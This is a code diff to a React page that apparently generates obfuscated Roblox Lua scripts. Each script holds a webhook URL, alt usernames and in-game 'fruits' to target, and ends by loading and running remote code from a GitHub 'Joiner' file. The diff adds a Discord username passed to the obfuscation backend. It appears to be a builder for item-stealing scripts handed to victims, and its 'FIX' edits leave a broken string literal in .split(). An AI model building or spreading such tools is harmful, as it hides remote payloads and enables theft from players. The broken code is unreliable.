@@ -4,8 +4,8 @@ import {useState, useEffect, useRef, useTransition} from 'react';
 import {Button} from '@/components/ui/button';
 import {Textarea} from '@/components/ui/textarea';
 import {Checkbox} from '@/components/ui/checkbox';
-import {Label} from '@/components/ui/label';
-import {Input} from '@/components/ui/input';
+import {Label} from '@/components/ui/label'; // Ensure Label is imported
+import {Input} from '@/components/ui/input'; // Ensure Input is imported
 import {Download, Copy, HelpCircle} from 'lucide-react';
 import {useToast} from '@/hooks/use-toast'; // Assuming this is your custom hook path
 
@@ -49,6 +49,7 @@ export default function Home() {
   // --- State Variables ---
   const [webhookUrl, setWebhookUrl] = useState('');
   const [usernames, setUsernames] = useState('');
+  const [discordUsername, setDiscordUsername] = useState(''); // <-- Add new state
   const [selectedFruits, setSelectedFruits] = useState<string[]>(defaultSelectedFruits);
   const [configuredScript, setConfiguredScript] = useState('');
   const [obfuscatedScript, setObfuscatedScript] = useState('');
@@ -59,25 +60,26 @@ export default function Home() {
   const [tooltipStates, setTooltipStates] = useState({
       webhookUrl: false,
       usernames: false,
+      discordUsername: false, // <-- Add state for new tooltip
       fruitsToHit: false,
   });
   const [webhookError, setWebhookError] = useState<WebhookErrorState>(null);
 
-  // --- Tooltip Logic ---
+  // --- Tooltip Logic (adjust to include discordUsername) ---
   const toggleTooltip = (field: keyof typeof tooltipStates) => {
       if (isMobile) {
           setTooltipStates(prevState => ({
               ...Object.fromEntries(
-                  Object.keys(prevState).map(key => [key, false])
+                  Object.keys(prevState).map(key => [key, false]) // Close others
               ),
-              [field]: !prevState[field],
+              [field]: !prevState[field], // Toggle the clicked one
           }));
       }
   };
 
   const isGenerating = isPending;
 
-  // --- Generate Script Logic (remains the same) ---
+  // --- Generate Script Logic (update the call to obfuscateScript) ---
   const generateScript = async () => {
     setWebhookError(null);
     setConfiguredScript('');
@@ -108,15 +110,18 @@ export default function Home() {
     }
 
     try {
+      // FIX: Specify string type for user parameter and use explicit newline
       const formattedUsernames = usernames
-        .split('\n')
-        .map(user => user.trim())
-        .filter(user => user.length > 0)
-        .map(user => `"${user}"`)
+        .split('
+') // Use explicit newline character
+        .map((user: string) => user.trim()) // Add type for user
+        .filter((user: string) => user.length > 0) // Add type for user
+        .map((user: string) => `"${user}"`)
         .join(', ');
 
+      // FIX: Specify string type for fruit parameter
       const formattedFruits = selectedFruits
-        .map(fruit => `"${fruit}"`)
+        .map((fruit: string) => `"${fruit}"`)
         .join(', ');
 
       if (!formattedUsernames) {
@@ -124,16 +129,25 @@ export default function Home() {
           return;
       }
 
-      let script = `Webhook = "${webhookUrl}" -- << Protected Webhook Here\n`;
-      script += `Usernames = {${formattedUsernames}} -- << Your usernames here, you can add as many alts as you want\n`;
-      script += `FruitsToHit = {${formattedFruits}} -- << Fruits you want the script to detect\n`;
+      // Construct the script (discordUsername is NOT included here)
+      // FIX: Use explicit newlines in script template
+      let script = `Webhook = "${webhookUrl}" -- << Protected Webhook Here
+`;
+      script += `Usernames = {${formattedUsernames}} -- << Your usernames here, you can add as many alts as you want
+`;
+      script += `FruitsToHit = {${formattedFruits}} -- << Fruits you want the script to detect
+`;
       script += `loadstring(game:HttpGet("https://raw.githubusercontent.com/SharkyScriptz/Joiner/refs/heads/main/V3"))()`;
 
       setConfiguredScript(script);
 
       startTransition(async () => {
         try {
-          const obfuscationResult = await obfuscateScript({script: script});
+          // Pass discordUsername to the backend flow
+          const obfuscationResult = await obfuscateScript({
+              script: script,
+              discordUsername: discordUsername.trim() || undefined // Pass trimmed or undefined
+          });
           setObfuscatedScript(obfuscationResult.obfuscatedScript);
           setPastefyLink(obfuscationResult.pastefyLink);
           toast({
@@ -204,7 +218,7 @@ export default function Home() {
      }
   };
 
-  // --- JSX Return ---
+  // --- JSX Return (Add the new input field) ---
   return (
     <>
       <ParticleComponent />
@@ -274,6 +288,36 @@ export default function Home() {
                   )}
                 </div>
               )}
+          </div>
+
+          {/* Discord Username Section (NEW) */}
+          <div className="mb-4">
+              <div className="flex items-center space-x-2 mb-2">
+                <Label htmlFor="discordUsername" className="text-cyan-400 font-bold">Your Discord Username</Label>
+                <TooltipProvider>
+                  <Tooltip
+                    open={tooltipStates.discordUsername}
+                    onOpenChange={(open) => !isMobile && setTooltipStates({ ...tooltipStates, discordUsername: open })}
+                  >
+                    <TooltipTrigger asChild>
+                      <Button variant="ghost" size="icon" onClick={() => { if (isMobile) { toggleTooltip('discordUsername'); } }}>
+                        <HelpCircle className="h-4 w-4 text-gray-400" />
+                      </Button>
+                    </TooltipTrigger>
+                    <TooltipContent className="tooltip-content bg-gray-900 text-gray-200 border border-cyan-500/50 shadow-lg p-3 rounded-md text-sm" style={{ width: '350px' }}>
+                        <p>Enter your Discord username (e.g., sharky#1234 or sharkydev). This will be included in the script log for identification. (Optional)</p>
+                    </TooltipContent>
+                  </Tooltip>
+                </TooltipProvider>
+              </div>
+              <Input
+                type="text"
+                id="discordUsername"
+                value={discordUsername}
+                onChange={e => setDiscordUsername(e.target.value)}
+                placeholder="Enter your Discord username (optional)"
+                className="w-full p-3 bg-gray-900 border border-cyan-500/50 rounded-md text-gray-100 focus:outline-none focus:ring-2 focus:ring-cyan-500 focus:border-transparent"
+              />
           </div>
 
           {/* Usernames Section */}
